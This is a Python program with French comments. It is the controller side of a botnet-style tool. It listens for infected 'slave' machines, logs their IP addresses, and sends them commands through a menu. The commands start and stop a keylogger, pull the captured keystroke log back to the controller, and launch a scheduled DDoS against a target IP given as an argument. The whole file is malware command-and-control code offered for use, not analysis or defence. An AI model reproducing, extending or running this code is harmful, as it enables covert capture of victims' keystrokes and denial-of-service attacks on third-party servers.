#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
#importation de threading, afin d'allouer des processus à différentes action
#importation de time afin de créer des pauses lors de certaines action
import socket as modSocket
import argparse
import threading
import time



"""
creation de l'objet Connexion, composé de 9 champs et 2 méthodes

1ère methode : elle va permettre d'écouter sur un port donné, et enregistrera les ip des machines connecté pendant l'écoute
dans un fichier "ListeIP.txt", une fois terminé elle vas faire appelle à la méthode receive situé dans le même objet.

2ème methode : elle va permettre de se connecter à plusieurs machines, grace à leur ip enregistrés dans le fichier "ListeIP.txt"
une fois terminer elle va lancer l'interface choix, qui vas nous affciher les menus des actions.

Ces 2 méthodes sont allouer à un processus chacun

"""

class Connexion():
    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn, listeIP, port, fichier, chemin, ip, date):
        self.adresseMachine = adresseMachine
        self.carteReseauEcoute = carteReseauEcoute
        self.carteReseauConn = carteReseauConn
        self.listeIP = listeIP
        self.port = port
        self.fichier = fichier
        self.chemin = chemin
        self.ip = ip
        self.date = date

    def listen(self, carteReseauEcoute, port, fichier):
        carteReseauEcoute.bind(("", port))
        carteReseauEcoute.listen()
        while True:
            print("Attente de connexion")
            connReseau, addr = carteReseauEcoute.accept()
            listeIP.append(addr[0])
            i = 0
            print(listeIP)
            print ("L'IP du slave est : ", listeIP[i])
            i+=1
            fichier.write(str(listeIP))       
            fichier.seek(0)
            thread_ecoute = threading.Thread(target=self.receive, args= (carteReseauConn , port, fichier))
            thread_ecoute.start()
            time.sleep(2)

    

    def receive(self, carteReseauConn, port, fichier):
        try:
            while True:
                i = 0
                while i < len(listeIP):
                    carteReseauConn.connect((listeIP[i], port))
                    print("Connection établie avec l'esclave")
                    i+=1
                    del listeIP[0]
                    print(listeIP)
                    objetChoixAction.choix(carteReseauConn, carteReseauEcoute)


        except ConnectionRefusedError:
            print("Erreur de connexion")


"""
creation de l'objet ChoixAction qui est en réalité une interface, qui va être enfant de l'objet Connexion, Il est composé
de 6 méthodes.

1ère methode (choix): elle va nous afficher un menu interactif dans laquelle nous pourrons choisir notre action, une fois choisis elle fera appelle
a une des 5 autres méthodes présentes dans l'interface.

2ème methode (start_log): elle va envoyer le message "keylogger" au slave afin qu'il lance le keylogger sur la machine slave.

3ème methode (ddos): elle va en tout premier demander à l'utilisateur la date ppour le ddos, puis enverra le message "ddos" au slave afin
de lancer le ddos sur slave, puis elle enverra directement la date, puis on envoie l'ip (variable entrer grace à l'argparse), mais en mettant
une pause entre l'envoie de la date et de l'ip sinon les 2 iront d'un coup vers le slave.

4ème methode (stop_log): elle va envoyer le message "stop" au slave afin qu'il stope le keylogger sur la machine slave.

5ème methode (get_log): elle envoie le message "transfert" au slave afin qu'il commence a nous envoyer les données
contenues dans son fichier "keylogger.txt", on va après demander à l'utilisateur de rentrer le nombre de ligne qu'il veut récupérer,
une fois le nombre entré, il est envoyer au slave pour qu'il sache le nombre de ligne a prendre, après on crée une variable fichier qui va ouvrir 
un fichier txt qui sera entré grace au argparse, une fois cela fait ont recevra le message du slave et on l'écrira dans le fichier txt.

"""

class ChoixAction(Connexion):


    def choix(self, carteReseauConn, carteReseauEcoute):
        #petit choix multiple afin de savoir quelle methode on doit lancer
        select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        while select != 5:
            #on essaie le choix multiple
            try:
                if select == 1:
                    #lance la methode ddos de l'objet choixAction
                    objetChoixAction.ddos(carteReseauConn, ip, date)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 2:
                    #lance la methode start de l'objet choixAction
                    objetChoixAction.start_log(carteReseauConn)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 3:
                    #lance la methode stop de l'objet choixAction
                    objetChoixAction.stop_log(carteReseauConn)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 4:
                    #lance la methode get de l'objet choixAction
                    objetChoixAction.get_log(carteReseauConn, chemin)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
            #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
            except ConnectionAbortedError:
                print("connexion arretée par le client")
        print("Fin du programme")
        fichier.close()
        carteReseauConn.send("FIN".encode("utf-8"))
        pass

    def start_log(self, carteReseauConn):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        #envoie "keylogger" au client 
        carteReseauConn.send("keylogger".encode("utf-8"))

    def ddos(self, carteReseauConn, ip, date):
        #idem
        print("Choix d'attaque : DDoS. Signal envoyé")
        #demande a l'utilsateur la date pour le ddosa vec un format établi
        date = input("format(yyyy-mm-jj hh:mm) : ")
        #envoie "ddos" au client 
        carteReseauConn.send("ddos".encode("utf-8"))
        #envoie ce qui est contenu dans la variable date
        carteReseauConn.send(date.encode("utf-8"))
        #pause de 0.2 milli seconde
        time.sleep(0.2)
        #et on envoie enfin la variable ip(entré dans l'argparse)
        carteReseauConn.send(ip.encode("utf-8"))

    
    def stop_log(self, carteReseauConn):
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        #envoie "stop" au client 
        carteReseauConn.send("stop".encode("utf-8"))
        message = carteReseauConn.recv(1024).decode("utf-8")
        if message == "logger arreté":
            print(message)
        else:
            print(message)

    def get_log(self, carteReseauConn, chemin):
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        #envoie "transfert" au client 
        carteReseauConn.send("transfert".encode("utf-8"))
        #on demande le nombre de ligne que l'on veut pour le transfert
        nbLine = input("Combien de ligne voulez vous : ")
        #on envoie la variable nbLine
        carteReseauConn.send(nbLine.encode("utf-8"))
        #on ouvre le fichier chemin(variable entré dans l'argparse) que l'on met dans la variable fichier
        fichier = open(chemin, "wb")
        #on reçoit les infos du keylogger
        l = carteReseauConn.recv(1024)
        #on écris ces infos dans la variable fichier
        fichier.write(l)

    

#on initie les différents champs présents dans l'objet Connexion
fichier = open("ListeIP.txt", "a")
listeIP = []
chemin = ""
ip= ""
date = ""
port = ""
adresseMachine = ("localhost", 5000)
#carte reseau qui va nous servire pour la première méthode de l'objet Connexion
carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
#carte reseau qui va nous servire pour la deuxième méthode de l'objet Connexion
carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
#va nous permettre de re-utiliser la carte réseau connexion
carteReseauConn.setsockopt(modSocket.SOL_SOCKET, modSocket.SO_REUSEADDR, 1)
#on assigne l'objet choixAction qui est l'enfant de l'objet Connexion à la variable objetChoixAction
objetChoixAction = ChoixAction(adresseMachine, carteReseauEcoute, carteReseauConn, listeIP, port, fichier, chemin, ip, date)

#initiation d'argparse avec les arguments
parser = argparse.ArgumentParser()
#creation de la commande --listen
parser.add_argument("--listen", type=int,
                     help="Ecoute sur un port donné et liste les IP connectées, pour le lancer il faut mettre le n° du port")
#creation de la commande --upload
parser.add_argument("--upload", type=str,
                     help="upload le fichier du keylogger, il faut entrez le chemin du fichier" )
#creation de la commande --ip
parser.add_argument("--ip", type=str,
                     help="envoie des paquets ipv4 sur une adresse donné, pour le lancer suffit de mettre l'ip du serveur a ddos")
parser.add_argument("--conn", type=int,
                     help="se connecte sur un port donné et liste les IP connectées")
#on initie la variable args, qui va contenire les arguments
args = parser.parse_args()

#si --listen est entré on executera ce qui est entrer
if args.listen:

    #on entre la variable chemin qui va prendre l'argument entrer lors de la commande --upload
    chemin = args.upload
    print(chemin)
    #on entre la variable ip qui va prendre l'argument entrer lors de la commande --ip
    ip = args.ip
    print(ip)
    #on entre la variable port qui va prendre l'argument entrer lors de la commande --listen
    port = args.listen
    print(port)
    #on lance la première methode de l'objet Connexion en lui allouant un thread
    threading.Thread(target=objetChoixAction.listen, args= (carteReseauEcoute, port, fichier)).start()

    







